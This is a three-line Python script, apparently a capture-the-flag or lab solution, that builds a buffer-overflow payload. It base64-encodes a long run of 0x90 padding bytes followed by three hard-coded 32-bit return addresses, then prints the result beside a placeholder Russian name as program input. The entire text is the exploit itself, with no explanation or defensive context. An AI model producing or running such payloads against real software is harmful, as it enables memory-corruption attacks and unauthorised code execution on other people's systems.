import base64
a = base64.b64encode(b'\x90'*4096 + b'\x90'*56 + b"\xfb\xcf\x04\x08" + b"\xe6\xcf\x04\x08" + b"\xf6\x6a\x15\x08")
print("Иван Иванов", a.decode())
